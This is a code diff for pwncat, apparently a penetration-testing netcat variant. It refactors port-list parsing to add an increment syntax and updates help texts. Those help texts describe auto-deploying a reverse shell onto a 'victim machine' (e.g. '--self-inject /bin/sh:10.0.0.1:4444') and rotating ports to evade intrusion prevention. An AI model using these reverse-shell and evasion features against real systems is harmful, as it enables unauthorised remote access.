@@ -3084,29 +3084,13 @@ def get_version():
 
 
 class ArgValidator(object):
+    """Validate command line arguments."""
 
     # --------------------------------------------------------------------------
-    # Helper Functions
+    # Private Functions
     # --------------------------------------------------------------------------
     @staticmethod
-    def is_valid_port(value):
-        # type: (int) -> bool
-        """Returns True if a given value is a valid port."""
-        return True if value > 0 and value < 65536 else False
-
-    @staticmethod
-    def is_valid_port_list(value):
-        # type: (str) -> bool
-        """Returns True if a given value is a valid port list by comma or range."""
-        cports = ArgValidator.get_port_list_by_comma(value)
-        rports = ArgValidator.get_port_list_by_range(value)
-        # XOR - only one method (comma or range) is allowed
-        if (cports and rports) or (not cports and not rports):
-            return False
-        return True
-
-    @staticmethod
-    def get_port_list_by_comma(value):
+    def __get_port_list_by_comma(value):
         # type: (str) -> List[int]
         """Returns a list of ports from a comma separated string or empty list if invalid."""
         ports = []
@@ -3119,18 +3103,66 @@ class ArgValidator(object):
         return ports
 
     @staticmethod
-    def get_port_list_by_range(value):
+    def __get_port_list_by_range(value):
         # type: (str) -> List[int]
         """Returns a list of ports from a range string or empty list if invalid."""
         ports = []  # type: List[int]
         match = re.search(r"^[0-9]+\-[0-9]+$", value)
         if match is not None:
             ranges = [int(r) for r in match.group(0).split("-")]
-            ports = [port for port in range(ranges[0], ranges[1] + 1)]
+            ports = list(range(ranges[0], ranges[1] + 1))
             for port in ports:
                 if not ArgValidator.is_valid_port(port):
                     return []
         return ports
+
+    @staticmethod
+    def __get_port_list_by_incr(value):
+        # type: (str) -> List[int]
+        """Returns a list of ports from an increment or empty list if invalid."""
+        ports = []  # type: List[int]
+        match = re.search(r"^[0-9]+\+[0-9]+$", value)
+        if match is not None:
+            ranges = [int(r) for r in match.group(0).split("+")]
+            ports = list(range(ranges[0], ranges[0] + ranges[1] + 1))
+            for port in ports:
+                if not ArgValidator.is_valid_port(port):
+                    return []
+        return ports
+
+    # --------------------------------------------------------------------------
+    # Helper Functions
+    # --------------------------------------------------------------------------
+    @staticmethod
+    def is_valid_port(value):
+        # type: (int) -> bool
+        """Returns True if a given value is a valid port."""
+        return 0 < value < 65536
+
+    @staticmethod
+    def is_valid_port_list(value):
+        # type: (str) -> bool
+        """Returns True if a given value is a valid port list by comma or range."""
+        cports = ArgValidator.__get_port_list_by_comma(value)
+        rports = ArgValidator.__get_port_list_by_range(value)
+        iports = ArgValidator.__get_port_list_by_incr(value)
+        # XOR - only one method (comma, range or increment) is allowed
+        if cports and not rports and not iports:
+            return True
+        if rports and not cports and not iports:
+            return True
+        if iports and not cports and not rports:
+            return True
+        return False
+
+    @staticmethod
+    def get_port_list_from_string(value):
+        # type: (str) -> List[int]
+        """Returns a list of ports from an comma, range or increment."""
+        cports = ArgValidator.__get_port_list_by_comma(value)
+        rports = ArgValidator.__get_port_list_by_range(value)
+        iports = ArgValidator.__get_port_list_by_incr(value)
+        return cports + rports + iports
 
     # --------------------------------------------------------------------------
     # Generic Type Functions
@@ -3138,7 +3170,7 @@ class ArgValidator(object):
     @staticmethod
     def type_port(value):
         # type: (str) -> int
-        """Check argument for valid port number."""
+        """Check argument for valid port."""
         if not ArgValidator.is_valid_port(int(value)):
             raise argparse.ArgumentTypeError("%s is an invalid port number." % value)
         return int(value)
@@ -3146,21 +3178,25 @@ class ArgValidator(object):
     @staticmethod
     def type_port_list(value):
         # type: (str) -> List[int]
-        """Check argument for valid port list separated by comma or range number"""
-        rports = ArgValidator.get_port_list_by_range(value)
-        cports = ArgValidator.get_port_list_by_comma(value)
+        """Check argument for valid port list separated by comma or range number."""
+        rports = ArgValidator.__get_port_list_by_range(value)
+        cports = ArgValidator.__get_port_list_by_comma(value)
+        iports = ArgValidator.__get_port_list_by_incr(value)
 
-        # Only use comma or range!
-        if rports and cports:
-            raise argparse.ArgumentTypeError("%s is invalid. Can only use comma or range." % value)
-        elif not rports and not cports:
+        # Only use comma, range or increment!
+        if (rports and cports) or (rports and iports) or (cports and iports):
+            raise argparse.ArgumentTypeError(
+                "%s is invalid. Can only use comma, range or increment." % value
+            )
+        if not rports and not cports and not iports:
             raise argparse.ArgumentTypeError("%s is an invalid port-list/range definition." % value)
         # Return whichever has a value
-        return rports if rports else cports
+        return rports + cports + iports
 
     @staticmethod
     def type_file_content(value):
         # type: (str) -> str
+        """Check argument for valid file content (file must exist and be readable)."""
         if not os.path.isfile(value):
             raise argparse.ArgumentTypeError("File not found: %s" % value)
         fhandle = open(value, mode="r")
@@ -3174,6 +3210,7 @@ class ArgValidator(object):
     @staticmethod
     def type_tos(value):
         # type: (str) -> str
+        """Check argument for valid --tos value."""
         if value not in ["mincost", "lowcost", "reliability", "throughput", "lowdelay"]:
             raise argparse.ArgumentTypeError("%s is an invalid tos definition." % value)
         return value
@@ -3181,6 +3218,7 @@ class ArgValidator(object):
     @staticmethod
     def type_info(value):
         # type: (str) -> str
+        """Check argument for valid --info value."""
         if value not in ["sock", "ipv4", "ipv6", "tcp", "all", ""]:
             raise argparse.ArgumentTypeError("%s is an invalid info definition." % value)
         return value
@@ -3188,7 +3226,7 @@ class ArgValidator(object):
     @staticmethod
     def type_crlf(value):
         # type: (Optional[str]) -> Optional[str]
-        """Evaluate a yes/no choice into True, False or None."""
+        """Check argument for valid --crlf value."""
         if value is None:
             return None
         if value.lower() in ["crlf", "lf", "cr", "no"]:
@@ -3198,6 +3236,7 @@ class ArgValidator(object):
     @staticmethod
     def type_color(value):
         # type: (str) -> str
+        """Check argument for valid --color value."""
         if value not in ["auto", "always", "never"]:
             raise argparse.ArgumentTypeError("%s is an invalid color definition." % value)
         return value
@@ -3205,7 +3244,7 @@ class ArgValidator(object):
     @staticmethod
     def type_local(value):
         # type: (str) -> str
-        """Check forward argument (-L) for correct pattern."""
+        """Check argument for valid -L/--local value."""
         match = re.search(r"^(.+:)?([0-9]+)$", value)
         if match is None or len(match.groups()) != 2:
             raise argparse.ArgumentTypeError("%s is not a valid '[addr:]port' format." % value)
@@ -3219,7 +3258,7 @@ class ArgValidator(object):
     @staticmethod
     def type_remote(value):
         # type: (str) -> str
-        """Check forward argument (-R) for correct pattern."""
+        """Check argument for valid -R/--remote value."""
         match = re.search(r"(.+):(.+)", value)
         if match is None or len(match.groups()) != 2:
             raise argparse.ArgumentTypeError("%s is not a valid 'addr:port' format." % value)
@@ -3230,6 +3269,7 @@ class ArgValidator(object):
     @staticmethod
     def type_self_inject(value):
         # type: (str) -> str
+        """Check argument for valid --self-inject value."""
         opts = value.split(":")
         if len(opts) != 3:
             raise argparse.ArgumentTypeError("%s is not a valid cmd:host:port[s] pattern." % value)
@@ -3610,9 +3650,11 @@ automatically deploy and background-run an unbreakable
 pwncat reverse shell onto the victim machine which then
 also connects back to you with specified arguments.
 Example: '--self-inject /bin/bash:10.0.0.1:4444'
-It is also possible to launch multiple reverse shells.
-Example: '--self-inject /bin/bash:10.0.0.1:4444,4445'
-Example: '--self-inject /bin/bash:10.0.0.1:4444-4450'
+It is also possible to launch multiple reverse shells by
+specifying multiple ports.
+Via list:  --self-inject /bin/sh:10.0.0.1:4444,4445,4446
+Via range: --self-inject /bin/sh:10.0.0.1:4444-4446
+Via incr:  --self-inject /bin/sh:10.0.0.1:4444+2
 Note: this is currently an experimental feature and does
 not work on Windows remote hosts yet.
 """,
@@ -3729,8 +3771,9 @@ Wait x seconds between re-initialization. (default: 1)
         help="""Listen mode (TCP and UDP):
 If the server is unable to initialize (e.g: cannot bind
 and --rebind is specified, it it will shuffle ports in
-round-robin mode to bind to. Use comma separated string
-such as '80,81,82' or a range of ports '80-100'.
+round-robin mode to bind to.
+Use comma separated string such as '80,81,82,83', a range
+of ports '80-83' or an increment '80+3'.
 Set --rebind to at least the number of ports to probe +1
 This option requires --rebind to be specified.
 
@@ -3773,8 +3816,8 @@ Wait x seconds between re-connects. (default: 1)
 If the remote server is not reachable or the connection
 is interrupted and --reconn is specified, the client
 will shuffle ports in round-robin mode to connect to.
-Use comma separated string such as '80,81,82' or a range
-of ports '80-100'.
+Use comma separated string such as '80,81,82,83', a range
+of ports '80-83' or an increment '80+3'.
 Set --reconn to at least the number of ports to probe +1
 This helps reverse shell to evade intrusiona prevention
 systems that will cut your connection and block the
@@ -3857,6 +3900,8 @@ Single character or strings are supported.
 Instruct the client to shuffle the specified ports in
 round-robin mode for a remote server to ping.
 This might be handy to scan outbound allowed ports.
+Use comma separated string such as '80,81,82,83', a range
+of ports '80-83' or an increment '80+3'.
 Use --ping-intvl 0 to be faster.
 
 """,
@@ -4077,9 +4122,7 @@ def main():
         # This will hand over to normal listening server on success or failure
         if args.self_inject:
             cnc_cmd, cnc_host, cnc_port = args.self_inject.split(":")
-            cnc_ports = ArgValidator.get_port_list_by_comma(
-                cnc_port
-            ) + ArgValidator.get_port_list_by_range(cnc_port)
+            cnc_ports = ArgValidator.get_port_list_from_string(cnc_port)
             CNCAutoDeploy(enc, net.consumer, net.producer, cnc_cmd, cnc_host, cnc_ports)
         run = Runner(PSEStore(ssig, [net]))
         run.add_action(
